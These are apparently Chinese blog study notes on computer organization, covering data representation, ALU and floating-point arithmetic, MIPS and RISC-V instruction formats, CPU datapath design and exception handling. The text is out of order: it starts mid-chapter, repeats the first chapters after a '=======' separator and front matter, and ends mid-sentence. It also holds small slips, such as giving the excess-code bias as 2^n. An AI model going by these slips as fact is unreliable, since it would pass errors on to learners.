对齐：要求数据存放的地址必须是相应的边界地址 每次访存只能读写一个字 浪费一定空间，换取存取时间 数据的检错与纠错 大多采用“冗余校验”思想，即除原数据信息外，还增加若干位编码，这些新增的代码被称为校验位。\n奇偶校验码 海明校验码 循环冗余校验码 第三章 运算方法和运算部件 加法器 串行进位 传递速度慢\n并行进位 用先行进位优化，各进位之间无等待，相互独立并同时产生\n但全先行电路复杂，成本高\n局部先行进位加法器： 组内并行、组间串行\n用多个位数较少的 n 位全先行进位加法器进行串联 多级先行进位加法器： 组内并行、组间并行\nALU的构成 ALU 如何控制实现加、减、与、或等等各种功能； 无符号整数和带符号整数的加、减运算电路完全一样，这个运算电路称为整数加/减运算部件。 在整数加/减运算部件基础上，加上寄存器、移位器以及控制逻辑，就可实现 ALU、乘/除运算以及浮点运算。 ALU 的 OF、SF、CF 和 ZF 标志信息如何产生。 零标志 ZF、溢出标志 OF、进/借位标志 CF、符号标志 SF 称为条件标志。 条件标志（Flag）在运算电路中产生，被记录到专门的寄存器中 存放标志的寄存器通常称为程序/状态字寄存器或标志寄存器。 溢出条件：\n无符号加、减溢出条件：CF=1 带符号加、减溢出条件：OF=1 定点数运算 移位 逻辑移位\n针对无符号数\n左移 n 位，即乘上位权的 n 次方。\n高位溢出丢弃，低位补 0\n算数移位\n左移与逻辑移位类似，但移到符号位结果更改 右移：低位移出丢弃，但高位补符号位，若移出 1，则发生精度丢失 加减 原码\n减法用减法器实现，1 变 0 补码\n符号位可以一起参与运算 [A+B]补=[A]补+ [B]补 [A-B]补=[A]补+[-B]补 [-B] 补 = [B] 补的 “取反加 1”，符号位也参与取反\n溢出判断：上溢正变负；只有可能同号运算出现；判断是否在合法表示范围内即可 乘法 无符号整数： 模拟手算乘法即可，计算机还需拆分部分积 具体实现：\n带符号整数 给无符号整数乘法电路添加一辅助位，让符号位参与运算。\n计算机底层判断溢出：\n若 2n 位的高 n + 1 位不均相同，则溢出 实现方式 ALU + 移位器 + 寄存器 + 控制逻辑 阵列乘法器 逻辑运算模拟 浮点数运算 浮点数加减运算的对阶原则和方法；\n原则：小阶向大阶看齐\n方法：阶小的那个数的尾数右移，右移位数等于两个阶码差的绝对值\nIEEE 754 尾数右移时，要将隐含的“1”移到小数部分，高位补 0，移出的低位保留到特定的“附加位”上\n如何计算移码表示的阶码的和与差（标准移码与 IEEE754 移码有什么差别）；\n阶码加法公式为： Eb ← Ex + Ey + 129 （ mod 2^8）\n阶码减法公式为： Eb ← Ex + [–Ey]补 + 127 （ mod 2^8）\n如何计算一个移码数减 1\n尾数规格化中的右规和左规方法；\n当尾数高位为 0，则需左规：尾数左移一次，阶码减 1，直到 MSB 为 1 每次阶码减 1 后要判断阶码是否下溢 先判断阶码是否为全 0，若是，则直接置阶码下溢；否则，阶码减 1 后判断阶码是否为全 0，若是，则阶码下溢。 当尾数最高位有进位，需右规：尾数右移一位，阶码加 1，直到 MSB 为 1 每次阶码加 1 后要判断阶码是否上溢 先判断阶码是否为全 1，若是，则直接置阶码上溢；否则，阶码加 1 后判断阶码是否为全 1，若是，则阶码上溢。 阶码溢出异常处理： 阶码上溢，则结果溢出； 阶码下溢，则结果为 0 乘法运算结果不需左规！最多右规 1 次！ 除法最多左规 1 次！不需右规！ 尾数的舍入处理常用方法；\n就近舍入：舍入为最近可表示的数 若为非中间值：LSB 后 1 位 0 舍 1 入 若为中间值：强迫结果为偶数， LSB= 1.1101110 → 1.1110 (1.1101110 → 1.1110, 110\u0026gt;100, 1.1101+0.0001 = 1.1110) 1.1101011 → 1.1101 (1.1101011 → 1.1101, 011\u0026lt;100, 1.1101+ 0 = 1.1101) 1.1101101 → 1.1110 1.1111100 → 10.0000 (1.1111100 → 10.0000, 100=100, 1.1111+0.0001 = 10.0000) 朝+∞方向舍入：舍入为右边最近可表示数 （正向舍入） 例：-1.1101101 →-1.1101 ； 1.1101101 →1.1110 朝-∞方向舍入：舍入为左边最近可表示数 （负向舍入） 例：-1.1101101 →-1.1110 ； 1.1101101 →1.1101 朝 0 方向舍入：直接截取所需位，后面的位丢弃。这种方法最简单 如何判断结果溢出（上溢和下溢）。\n第四章 指令格式 指令：是指示计算机执行某种操作的命令，是计算机运行的最小功能单位。\n根据地址码数不同 零地址指令： 不需要操作数，如停机、关中断等 堆栈计算机，操作数隐藏在栈顶 一地址指令： 只需单操作数，如加一、取反 需两个操作数，但其中一个存储在某个寄存器内 二地址指令： 用于需要两个操作数的算术运算 三地址指令： 多一个地址存储结果 四地址指令： 再多一个地址存储下一个指令地址 指令位数不变时，地址码数越多，寻址能力越差\n按指令长度分类 指令字长：一条指令的总长度(可能会变)\n影响取指令所需时间\n机器字长：CPU进行一次整数运算所能处理的二进制数据的位数(通常和ALU直接相关)\n存储字长：一个存储单元中的二进制代码位数（通常和MDR位数相同)\n按操作码长度分类 定长：译码电路设计简单，但复杂性低\n按操作类型分类 数据传送\nLOAD：把存储器中的数据放到寄存器中\nSTORE： 把寄存器中的数据放到存储器中\n算数逻辑操作\n算数、逻辑（与或非、位操作） 移位操作\n算数、逻辑、循环移位 转移操作（改变程序执行流，PC指针改变）\n无条件转移 JMP\n条件转移JZ：结果为0；JO：结果溢出；JC：结果有进位\n调用和返回 CALL和RETURN\n陷阱(Trap)与陷阱指令\n输入输出操作\nCPU寄存器与IO端口之间的数据传送(端口即IO接口中的寄存器) 设计 指令格式的选择应遵循的几条基本原则 应尽量短 要有足够的操作码位数 指令编码必须有唯一的解释，否则是不合法的指令 指令字长应是字节的整数倍 合理地选择地址字段的个数 指令尽量规整 一条指令必须明显或隐含包含以下信息： 操作码：指定操作类型 源操作数或其地址：一个或多个源操作数所在的地址 结果的地址：产生的结果存放何处（目的操作数） 下一条指令地址：下条指令存放何处 指令的寻址方式\u0026mdash;-简单 顺序执行：PC增值 跳转 （ jump / branch / call / return ）：同操作数寻址 操作数的寻址方式\u0026mdash;-复杂 操作数来源：寄存器 / 主（虚）存 /外设端口 / 栈顶 操作数结构：位 / 字节 / 半字 / 字 / 双字 / 一维表 / 二维表 /… 通常寻址方式特指“操作数的寻址” 扩展操作码 格式：定长指令字结构 + 可边长操作码\n即不同地址数的指令使用不同的操作码，便于判断 通常情况下，对使用频率较高的指令，分配较短的操作码；对使用 频率较低的指令，分配较长的操作码，从而尽可能减少指令译码和 分析的时间。\n设地址长度为n，上一层留出m种状态，下一层可扩展出mx2^n种状态\n注意短的操作码不能是长操作码的前缀\n寻址方式 PC：程序计数器，取址后会自动加一\n指令寻址 确定下一条指令的存放地址，由 PC 指明\n顺序寻址：\nPC + ”1“ 1 理解为一个指令字长，根据指令字长变化字节编码 跳跃寻址\n执行转移指令导致 PC 值改变（直接修改） 数据寻址 确定本条指令的地址码指明的真实地址\n程序存储位置是相对的，需要用偏移量解读\n在地址码中划分出寻址特征，规定该地址需要用何种方式寻址\n直接寻址：存储 = 真实，即 EA = A\n间接寻址：存储的是真实值的地址，即 EA = （A）\n寄存器寻址：指令字中直接给出操作数所在寄存器编号\n寄存器间接寻址：寄存器存储的是操作数所在储存单元的地址，即 EA = （R）\n隐含寻址：非显示给出的操作数\n立即寻址：地址就是操作数本身，又称立即数\n基址寻址：以程序的起始存放地址作为起点，EA = （BR）+ A\nBR 为基址寄存器，由操作系统决定，不可更改\n变址寻址：程序员自己决定从哪里作为起点，EA = （IX）+ A IX 为变址寄存器，可由用户决定。类似一个指针，设置为数组首地址等\n相对寻址：程序计数器PC所指地址作为起点，EA = （PC）+ A\n堆栈寻址：操作数存放在堆栈中，隐含使用堆栈指针(SP)作为操作数地址。\n堆栈可以用寄存器实现（硬堆栈）或主存实现，硬堆栈不妨存，速度快\n优缺点 条件测试方式(?) 对于带符号数和无符号数运算，标志生成方式有没有不同？\n答：没有，因为加法电路不知道是无符号数还是带符号整数！\n指令系统设计风格 累加器型： （earliest machines） 特点：其中一个操作数（源操作数 1）和目的操作数总在累加器中 堆栈型： （e.g. HP calculator, Java virtual machines) 特点：总是将栈顶两个操作数进行运算，指令无需指定操作数地址 通用寄存器型： （e.g. IA-32, Motorola 68xxx) 特点：操作数可以是寄存器或存储器数据（即 A、B 和 C 可以是寄存器或存储单元） 装入/存储型： （e.g. SPARC, MIPS, PowerPC) 特点：运算指令的操作数只能是寄存器数据，只有 load/store 能访问存储器 指令集：CISC 和 RISC CISC（Complex Instruction Set Computer）：\n一条指令完成一个复杂的基本功能。 x86 架构 RISC（Reduced Instruction Set Computer）：\n一条指令完成一个基本“动作”；多条指令组合完成一个复杂的基本功能。\n电路简单，功耗小，寄存器多\n只有 LOAD、STORE 指令可以访存\nARM 架构，主要用于手机、平板\n在程序中各种指令出现的频率悬殊很大，最常使用的是一些简单指令，这些指令占程序的80%，但只占指令系统的20%。而且在微程序控制的计算机中，占指令总数20%的复杂指令占用了控制存储器容量的80%。\nMIPS 的指令格式 所有指令都是32位宽（字长），按字地址对齐存储，字地址为4的倍数\n分为 R、I、J 型\nR 型 参与运算的操作数和结果都在寄存器，R 型指令的寻址方式只有寄存器寻址一种； R 型指令的 op 全为 0，具体功能由 func 部分确定； rs：第一个源操作数（source register） rt：第 2 个源操作数（target register） rd：目的寄存器（destination register） shamt：对非移位指令为 00000。移位指令为移位次数。 I 型 指令中包含了一个立即数，所以称为 I 型指令。 op：确定指令的功能； rs：可以是一个源操作数，寄存器寻址；或者在存取指令中用作基址寄存器，偏移寻址。 rt：目的寄存器 Immediate：长度为 16 位的立即数，指令执行时需扩展为 32 位。根据指令的不同，可以有以下三种用法： 运算类指令（ori）：以立即寻址方式提供的一个源操作数。 存取指令（lw/sw）：作为偏移量，与寄存器 rs 组成偏移寻址方式，提供一个存储器操作数。 条件转移指令（bne）：作为偏移量，与 PC 寄存器组成相对寻址方式，提供一个转移目的地址。 J 型 op：确定指令的功能 address：转移地址 整合 三种指令 汇编格式 a=b op c 把=和op变成逗号 R型指令格式是op+rs+rt+rd+shamt+func 汇编格式是 xxx $rs, $rt, $rd I型指令格式是op+rs+rt+imm 汇编格式是 xxx $rt, $rs, imm J型指令格式是op+addr 汇编格式是 xxx addr MIPS 的通用寄存器 0 号寄存器$zero 为固定值零，不能改变 MIPS还提供了32个32位的单精度浮点寄存器$f0∽$f31,用于浮点数指令。它们可配对成16个64位的双精度浮点寄存器。 在汇编语言中使用寄存器时可以用寄存器名，也可以用寄存器号，前面加上“$”,例如，$8或$t0。 寄存器 长度：32 位 个数：32 个 MIPS 的寻址方式 寄存器寻址 可以出现在 R 型和 I 型格式中 立即数寻址 偏移寻址 PC 相对寻址 PC\u0026lt;\u0026ndash; PC+4+imm*4 伪直接寻址 为什么称伪直接？ 最终地址：PC 高四位+addr+两个 0，+表示拼接 位数：4+26+2=32 机器语言的解码（反汇编）？ 高级语言、汇编语言、机器语言之间的转换 ？ RISC-V 指令系统 具有模块化结构，稳定性和可扩展性好，在简洁性、实现成本、功耗、性能和程序代码量等各方面具有显著优势。\n模块化结构：\n核心：RV32I + 标准扩展集：RV32M、RV32F、RV32D、RV32A = RV32G 32位架构RV32G = RV32IMAFD，其压缩指令集RV32C（指令长度16位） 64位架构RV64G = RV64IMAFD，其压缩指令集RV64C（指令长度16位） 向量计算RV32V和RV64V；嵌入式RV32E（RV32I的子集，16个通用寄存器） 指令格式 32位 R-型为寄存器操作数指令\nI-型为短立即数或装入（Load）指令\nS-型为存储（Store）指令\nB-型为条件跳转指令\nU-型为长立即数操作指令\nJ-型为无条件跳转指令\n16位压缩 第五章 中央处理器 CPU 的功能和基本结构 CPU 基本功能： 指令控制。完成取指令、分析指令和执行指令的操作，即程序的顺序控制。 操作控制。一条指令的功能往往是由若干操作信号的组合来实现的。CPU 管理并产生由内存取出的每条指令的操作信号，把各种操作信号送往相应的部件从而控制这些部件按指令的要求进行动作。 时间控制。对各种操作加以时间上的控制。时间控制要为每条指令按时间顺序提供应有的控制信号。 数据加工。对数据进行算术和逻辑运算。 中断处理。对计算机运行过程中出现的异常情况和特殊请求进行处理。 基本结构 数据通路 + 控制器\n控制器 对指令进行译码，生成指令对应的控制信号，控制数据通路的动作。它向执行部件发出控制信号，是指令的控制部件。 数据通路 由操作元件和存储元件通过总线方式或分散方式连接而成的进行数据传送、处理和存储的路径。\n数据通路\n指令执行过程中，数据所经过的路径，以及路径上的部件。\n包括：ALU、通用寄存器、状态寄存器、MMU、cache、中断处理逻辑等\n数据通路中专门进行数据运算的部件称为执行部件或功能部件\n功能：进行数据传送、处理和存储\n组成元件\n组合逻辑元件（操作元件）：输出只取决于当前输入 时序逻辑元件（也称状态元件，或存储元件）：在时钟控制下输入被写到电路中，直到下个时钟到达。 定时方式：规定信号何时写入状态元件（上升沿、下降沿、电平触发） 存储元件：寄存器 \u0026ndash;\u0026gt; 寄存器组 连接方式\n总线、分散 时序控制（过去式）：\n现代时钟周期 …… + 状态元件 + 操作元件( 组合电路) + 状态元件 + …… 只有状态元件能存储信息，所有操作元件都从状态元件接收输入，并将输出写入状态元件中。 时钟周期= Latch Prop + Longest Delay Path + Setup + Clock Skew(时钟偏移) 约束条件：操作元件输出有效信号最快出现必须在下一级状态元件的输入保持时间之后出现 单周期 MIPS 处理器的设计 复习：三种指令类型 R、I、J\n设计处理器步骤 分析每条指令功能，并用 RTL（Register Transfer Language）来表示 根据指令的功能给出所需的元件，并考虑如何将他们互连 确定每个元件所需控制信号的取值 汇总所有指令所涉及到的控制信号，生成一张反映指令与控制信 号之间关系的表 根据表得到每个控制信号的逻辑表达式，据此设计控制器电路 设计数据通路 R-type：取指 \u0026ndash;\u0026gt; 取寄存器 \u0026ndash;\u0026gt; 运算 \u0026ndash;\u0026gt; 输出、计算下地址 M[PC] 从PC所指的内存单元中取指令 R[rd] ← R[rs] + R[rt] 从rs、r所指的寄存器中取数后相加。若结果不溢出，则将结果送rd所指的寄存器中；若结果溢出，则不送结果，并转到“溢出处理程序”执行。 PC ← PC + 4 PC加4，使PC指向下一条指令 I-type M[PC] 取指令（公共操作，取指部件完成） R[rt] ← R[rs] or ZeroExt(imm16) 立即数零扩展，并与rs内容做“或”运算 PC ← PC + 4 计算下地址（公共操作，取指部件完成） Lw 装入指令 M[PC] 取指令（公共操作，取指部件完成） Addr ← R[rs] + SignExt(imm16) 计算存储单元地址 (立即数符号扩展！) R[rt] ← M [Addr]装入数据到寄存器rt中 PC ← PC + 4计算下地址（公共操作，取指部件完成） sw 指令 M[PC] 取指令（公共操作，取指部件完成） Addr ← R[rs] + SignExt(imm16) 计算存储单元地址（符号扩展！） M[Addr] ← R[rt] 寄存器rt中的内容存到内存单元中 PC ← PC + 4 计算下地址（公共操作，取指部件完成） 分支指令 M[PC] 取指令（公共操作，取指部件完成） Cond ← R[rs] - R[rt] 做减法比较rs和rt中的内容 if (Cond eq 0) 计算下地址（根据比较结果，修改PC） PC ← PC + 4 + ( SignExt(imm16) x 4 ) else PC ← PC + 4 无条件跳转指令 M[PC]\t取指令（公共操作，取指部件完成） PC\u0026lt;31:2\u0026gt; ← PC\u0026lt;31:28\u0026gt; 串接 target\u0026lt;25:0\u0026gt; 计算目标地址 指令范围有多大？ 不是相对寻址，是绝对寻址。转移范围只能在 j 指令所在的228=256MB页面内，页面号与j指令相同 PC\u0026lt;31:28\u0026gt;\n完成 时间计算 设计控制器 方法： 根据每条指令的功能，分析控制信号的取值，并列表表示。 根据列出的指令和控制信号的关系，写出每个控制信号的逻辑表达式。 PPT 上看指令译码后条件码的产生、执行过程，内容较多\n设计逻辑 MIPS指令格式中指示操作性质有op 和 func两个字段，分别用来产生两类不同的控制信号 func只用于R型指令，形成对应的ALU的功能控制信号 op用来产生各种控制信号，包括了非R型指令的ALU功能控制信号 控制器 = 主控制单元 + ALU局部控制单元 单周期处理器的性能 CPI = 1；其他条件一定的情况下，CPI越小，则性能越好！ 除CPI外，还取决于时钟周期的宽度，单周期处理器的时钟宽度为最复杂指令的执行时间 但是，对每类指令采用可变长时钟周期实现非常困难，而且所带来的额外开销会很大，不合算 单周期处理器的问题 时钟周期以最复杂指令所需时间为准，太长 解决思路 把指令的执行分成多个阶段，每个阶段用一个时钟周期完成 多周期处理器 时钟周期短 不同指令所用周期数可以不同 允许功能部件在一条指令执行过程中被多次使用 微程序设计和异常处理 硬连线控制器的特点\n优点：速度快，适合于简单或规整的指令系统，例如 MIPS 指令集\n缺点：它是一个多输入/多输出的巨大逻辑网络。对于复杂指令系统来说，结构庞杂，不用大规模集成电路则实现困难；修改、维护不易；灵活性差。\n简化方法：微程序设计\n微程序控制器\n仿照程序设计的方法，编制每条指令对应的微程序 所有指令对应的微程序放在只读存储器（控制存储器）中，执行某条指令就是取出对应微程序中的各条微指令，对微指令译码产生对应的微命令(即控制信号) 特点：具有规整性、可维护性和灵活性，但速度慢 基本结构\n微指令格式\n水平型：相容微命令尽量多地安排在一条微指令中\n优点：微程序短，并行性高，适合于较高速度的场合 缺点：微指令长，编码空间利用率较低，并且编制困难 垂直型：一条微指令只控制一、二个微命令\n包含：若干微命令、下条微指令地址（可选）、常数（可选）\n异常和中断的处理 中断\n内部异常：在CPU内部发生的意外事件或特殊事件 故障（fault）：执行指令引起的异常事件，如溢出、缺页、堆栈溢出、访问超时等 自陷（Trap）：预先安排的事件，如单步跟踪、系统调用(执行访管指令)等 终止（Abort）：硬故障事件，此时机器将“终止”，调出中断服务程序来重启操作系统 外部中断：在CPU外部发生的特殊事件，通过向CPU发“中断请求”信号，请求CPU处理 处理机制\n关中断（“中断/异常允许”状态位清0）：使处理器处于“禁止中断”状态，以防止新异常(或中断)破坏断点、程序状态和现场（现场指通用寄存器的值）。 保护断点和程序状态：将断点和程序状态保存到堆栈或特殊寄存器中。 识别异常事件：有软件识别和硬件识别（向量中断方式）两种不同的方式。 软件识别（MIPS采用）：设置一个异常状态寄存器（MIPS中为Cause寄存器），用于记录异常原因。操作系统中有一个统一的异常处理程序，该程序按优先级顺序查询异常状态寄存器的各位，识别出异常事件 硬件识别（向量中断）：用专门的硬件查询电路按优先级顺序识别异常，得到“中断类型号” MIPS 异常处理数据通路设计\n增加以下两个寄存器 EPC：32位，用于存放断点（异常处理后返回到的指令的地址） Cause：32位，记录异常原因 增加两个寄存器的“写使能”控制信号 EPCWr：在保存断点时该信号有效，使断点PC写入EPC CauseWr：在处理器发现异常（如：非法指令、溢出）时，该信号有效，使异常类型被写到Cause寄存器 需要一个控制信号IntCause来选择正确的值写入到Cause中 需要将异常查询程序的入口地址（MIPS为0x8000 0180）写入PC，可以在原来PCSource控制的多路复用器中再增加一路，其输入为0x8000 0180 必须考虑：保存断点和异常原因，并将控制转到异常处理程序首地址处 =======\ntitle: \u0026ldquo;计算机组成原理\u0026rdquo; subtitle: \u0026ldquo;王道课程笔记\u0026rdquo; summary: \u0026ldquo;计算机组成原理课程的笔记\u0026rdquo; description: \u0026ldquo;计算机组成原理课程的笔记\u0026rdquo; date: 2025-10-03 lastmod: 2025-11-06 image: \u0026quot;\u0026quot; draft: false toc: enable: true weight: false categories: [\u0026ldquo;笔记\u0026rdquo;] tags: [\u0026ldquo;笔记\u0026rdquo;] 第一章 计算机系统概述 计算机系统的发展 计算机系统 = 硬件 + 软件\n软件 系统软件：用来管理整个计算机系统\n应用软件：按任务需要编制成的程序\n硬件 第一台电子数字计算机：ENIAC\n逻辑元件（用于处理电信号的最小单元）：电子管\n十进制表示，手动编程\n无冯 · 诺伊曼结构\n第二代：晶体管\n元器件：逻辑元件（晶体管），内存（磁芯），外存（磁鼓，磁带） 特点：变址，浮点运算，多路存储器，I/O 处理机，中央交换结构（非总线）。 软件：使用高级语言，提供系统软件。 第三代：中小规模集成电路\n元器件：逻辑元件和主存储器均由集成电路实现。 特点：微程序控制，Cache，虚拟存储器，流水线。 代表机种：IBM 360（大型机），DEC PDP-8（小型机），巨型机。 IBM 360（兼容机）\n相同/相似的指令集\u0026amp;操作系统。\n好处： 原来机器上的程序可以不改动而在新机器上运行，但性能不同。\n保持兼容的关键：低端机指令集是高端机的一个子集，称为“向后兼容”。\nDEC PDP-8（采用总线结构）\n总线结构好处：可扩充性好（允许将新的符合标准的模块插入总线，形成各种配置），节省器件，体积小，价格便宜\n第四代：大规模、超大规模集成电路\n半导体存储器，微处理器发展迅速。 特点：共享存储器，分布式存储器以及大规模并行系统。 组成 冯诺依曼结构模型 冯诺依曼提出存储程序，取代手动接线。\n冯诺依曼结构：\n计算机由运算器，控制器，存储器，输入设备和输出设备五个基本部件组成。 各基本部件功能： 存储器不仅能存放数据，而且也能存放指令，形式上两者没有区别，但计算机应能区分数据还是指令； 控制器应能自动执行指令； 运算器应能进行加/减/乘/除四种基本算术运算，并且也能进行一些逻辑运算和附加运算； 操作人员可以通过输入设备和输出设备与主机进行通信。 内部以二进制数表述指令和数据 每条指令由操作码和地址码两部分组成。操作码指出操作的类型，地址码指出操作数的地址。 由一串指令组成程序。 采用存储程序工作方式 将事先编好的程序和原始数据送入主存中；启动执行后，在不需操作人员干预下，自动完成逐条取出指令和执行指令的任务。 基本部件及其功能 运算器（数据运算）：ALU、GPRs、标志寄存器等。 存储器（数据存储）：存储阵列、地址译码器、读写控制电路 总线（数据传送）：数据线（MDR）、地址线（MAR）和控制线 控制器（控制）：对指令译码生成控制信号 CPU = 运算器 + 控制器\n主机 = CPU + 主存\n各硬件工作原理 主存储器 主存储器 = 存储体 + MAR + MDR\nMemory Address Register 存储地址寄存器：指示位置，位数反应存储单元的个数 Memory Data Register 存储数据寄存器：指示存入、取出的具体数据（包括指令） 存储体：数据、指令在存储体内按地址存储，每个存储单元对应一个地址 1B = 1 byte ; 1 b = 1 bit\nMAR、MDR 逻辑上属于主存，但被集成到 CPU\n运算器 实现算数运算、逻辑运算\n运算器 = ACC + ALU + MQ + X\nAccumulator：累加器，存放操作数或运算结果 Multiple-Quotient Register：乘商寄存器，乘除运算时，存放操作数或运算结果 Arithmetic and Logic Unit：算数逻辑单元，通过复杂电路实现算数运算、逻辑运算 X：通用的操作数寄存器，用于存放操作数 控制器 控制器 = CU + IR +PC\nControl Unit:控制单元，分析指令，给出控制信号\nInstruction Register:指令寄存器，存放当前执行的指令\nProgram Counter:程序计数器，存放下一条指令地址，有自动加1功能\n配合 指令和数据 程序启动前，指令和数据都存储在存储器中，形式上没有区别，都是 0/1 序列。 采用存储程序的工作方式，程序由指令组成，启动后计算机自动取出一条条指令并执行，无需人的干预。 指令执行过程中，指令和数据从存储器取到 CPU，指令存在 IR 中，数据在 GPR 中。 指令需要给出的信息 操作码：指令的操作，加减法等 一个或多个源操作数：立即数、寄存器编号、存储地址 目的操作数地址：寄存器编号、存储地址 执行过程 程序执行前 数据和指令事先存放在存储器中，每条指令和每个数据都有地址，指令按序存放。指令由 OP、ADDR 字段组成，程序起始地址送入 PC。 开始执行程序 根据 PC 取指令送 IR：PC -\u0026gt; MAR -\u0026gt;存储器 -\u0026gt; MDR -\u0026gt; IR 指令译码：IR -\u0026gt; 控制器，控制器译码 取操作数：GPRs 或存储器 -\u0026gt; ALU 执行指令操作：ALU 运算 回写结果到 GPRs 或存储器 修改 PC 的值，使其指向下一条指令 重复上述步骤直到程序完成 软件 系统软件——简化编程，使硬件资源被有效利用 操作系统：硬件资源管理，用户接口 语言处理程序：翻译程序，Linker，Debug\u0026hellip; 翻译程序 汇编器（Assembler）：汇编语言源程序-\u0026gt;机器目标程序。或许叫汇编器更好理解？ 编译器（Complier）：高级语言程序-\u0026gt;汇编/机器目标程序。或许叫编译器更好理解？ 解释器（Interpreter）：将高级语言程序语句逐条翻译成机器指令并执行，不生成目标文件。（跳过汇编阶段） 其他实用程序：磁盘碎片整理、备份程序\u0026hellip; 机器语言：二进制代码\n汇编语言：助记符\n高级语言：C、C++、……\n应用软件——解决具体的应用问题 层次结构 语言层次 微指令系统：直接控制硬件执行 机器语言：传统机器M1，执行二进制机器指令 操作系统机器\n汇编语言：虚拟机器M2，用汇编语言翻译成机器语言\n高级语言：虚拟机器M3，需要编译成汇编、机器语言\n上两层视为硬件层\n计算机体系结构：讨论如何设计硬件与软件之间的接口\n计算机组成原理：讨论如何用硬件实现接口\nISA 指令集体系结构，其作为规约，规定了如何使用硬件。\n可执行的指令集合，包括指令格式、操作种类以及对应操作数的规定。 可以接受的操作数类型。 操作数存放的寄存器组结构，例如寄存器名称、编号、长度和用途。 操作数存放的存储空间的大小和编址方式。 操作数在存储空间中按大/小端方式存放。 指令获得操作数的方式，即寻址方式。 指令执行过程的控制方式，例如程序计数器，条件码定义等。 ISA 是计算机系统中必不可少的抽象层。\n性能指标 存储器 总容量 = 存储单元个数 * 存储字长(bit)\nCPU 基本概念 主频：CPU内数字脉冲信号振荡的频率\n= 1 / 时钟周期 CPI：执行一条指令需要多少个时钟周期（不同指令，CPI不同）\nCPU执行时间：执行整个程序的耗时 = (条数 * CPI) / 主频\nIPS：每秒执行多少个命令 = 主频 / 平均CPI\nFLOPS：每秒执行多少次浮点运算\nK=Kilo=千=10^3\nM=Million=百万=10^6\nG=Giga=十亿=10^9\nT=Tera=万亿=10^12\n数据通路带宽：数据总线一次所能并行传送信息的位数（各硬件部件通过数据总线传输数据）\n吞吐量：单位时间内处理请求的数量\n相应时间：CPU时间 + 等待时间\n基准程序：用于测量的程序\nMIPS（Million Instructions Per Second）：每秒执行多少百万条指令，着重点在于单条指令。\nMIPS 为平均值，其并没有考虑以上三个属性，并且由于：\n不同机器指令集不同 程序由不同指令混合而成 指令的频率会动态变换 厂家给出峰值 MIPS 因此，MIPS 表示性能存在局限性。\nMFLOPS：每秒执行浮点运算多少百万次，着重在于浮点操作本身。\n计算 CPU 执行时间=CPI×程序总指令条数×时钟周期\n第二章 数据的机器级表示 信息二进制编码 计算机内部数据：二进制表示\n机器级数据：\n数值数据，无符号/带符号整数，浮点数，十进制数 非数值数据，逻辑数，汉字 二进制编码原因：\n制造两个稳态的物理器件容易 二进制编码、计数、运算规则简单。 与逻辑命题对应，便于逻辑运算，方便地用逻辑电路实现算术运算。 机器数：0/1 编码的 0/1 内部 0/1 序列。\n真值：机器数真正的值\n数值数据表示方法 三要素：\n进位计数制：十进制，二进制等转换。 定点浮点表示：定点整数/小数；浮点数（使用一个定点小数和一个定点整数表示） 编码：原码补码反码等。 若不知道三要素，那么便无法得知机器数的具体真值。\n进制转换：\n二进制 -\u0026gt; 其他：划分位数，对应 十六、八 -\u0026gt; 二：位数对应，补全 十进制 -\u0026gt; 任意位数：求商取余 定点数的表示 常规计数，小数点位置固定。整数、小数分开存储。\n无符号数：没有符号位\n原码：\n有 +0、-0 两种表示形式 反码：\n正数与原码相同 若符号位为1，则数值位全部取反 依然有 +0、-0 补码：\n将减法抓换为等价的加法（加上补数） = 原码除符号位外，取反后加一（即反码 + 1） 移码： 将每一个数值加上一个偏置常数（ bias）\n一般来说，当编码位数为 n **时，bias 取 2^n 标准移码\n为什么要用移码来表示阶码？\n便于浮点数加减运算时的对阶操作（比较大小）\n与补码的关系：最高位相反，其余位相同\nC语言的解析 无符号数变为有符号：不改变数据内容，改变解释方式\n长变短：高位截断，保留地位\n短变长：符号扩展\n负数补1，正数补0 IEEE编码 规定了二进制浮点数算数标准，类似科学计数法简化计数\n二进制浮点数 符号：决定数值的正负性\n尾数：影响数值的精度。尾数的位数越多，精度越高\n阶码：反映小数点的实际位置\n基数：K进制通常默认基数为K\n规格化：石确保尾数的最高位非0数位刚好在小数点之前\nfloat型：32位单精度\n符号 + 阶码 + 尾数：1 + 8 + 23 double型：64位双精度\n符号 + 阶码 + 尾数：1 + 11 + 52 float单精度 默认存储规格化尾数，小数点前的1省略（隐含）\n基数规定为 2\n阶码用移码表示，规定偏置值为 127\n如何将十进制真值转换为偏置值为M的移码？\n将十进制真值+偏置值\n按“无符号整数”规则转换为指定位数\ndouble双精度 偏置值为1023 表示范围 特殊状态 阶码全 0，或阶码全 1\n阶码真值的取值范围为 -126 ~ 127（单精度） 根据数轴，存在：\n正上溢、正下溢、负上溢，负下移 上溢置为无穷，下溢置为0 数据表示 十进制数表示 ASCII 码：就是把数字当作字符存储，0-9用30H-39H表示\n前分隔：正号用 2B 负号用 2D 放在最前面 后嵌入：将符号嵌入最低位数字的 ASCII 码高 4 位中。 正数不变；负数高 4 位变为 0111。 BCD 码\n每 1 位十进制数用 4 位二进制表示。而 4 位二进制数可组合成 16 种状态，只需要选 10 种状态来表示十进制数。 西文字符表示： 复习要点中未提到\n十进制数字：0/1/2…/9 10 个 英文字母：A/B/…/Z/a/b/…/z 52 个 专用符号：+/-/%/*/\u0026amp;/…… 33 个 控制字符（不可打印或显示） 33 个 汉字表示 输入码：用于输入汉字。 内码：用于在系统中进行存储、查找、传送等处理 字模点阵或轮廓描述：用于显示/打印 数据的宽度 bit 字节： 现代计算机中，存储器按字节编址 字节是最小可寻址单位 （addressable unit ） LSB 表示最低有效字节，MSB 表示最高有效字节 字 表示被处理信息的单位，用来度量数据类型的宽度 字长 指某特定机器定点运算时数据通路的宽度。 数据通路： CPU 内部进行数据运算、存储和传送的路径以及路径上的部件。 等于 CPU 内部总线的宽度，或运算器的位数，或通用寄存器的宽度。 数据的存储和排列顺序 大小端 小端（ Little Endian）:低字节放低地址 大端（ Big Endian）:高字节放低地址 指令中，操作码和寄存器号的存放顺序不变，只需要考虑立即数的顺序 对齐：要求数据存放的地址必须是相应的边界地址 每次访存只能读写一个字 浪费一定空间，换取存取时间 数据的检错与纠错 大多采用“冗余校验”思想，即除原数据信息外，还增加若干位编码，这些新增的代码被称为校验位。\n奇偶校验码 海明校验码 循环冗余校验码 第三章 运算方法和运算部件 加法器 串行进位 传递速度慢\n并行进位 用先行进位优化，各进位之间无等待，相互独立并同时产生\n但全先行电路复杂，成本高\n局部先行进位加法器： 组内并行、组间串行\n用多个位数较少的 n 位全先行进位加法器进行串联 多级先行进位加法器： 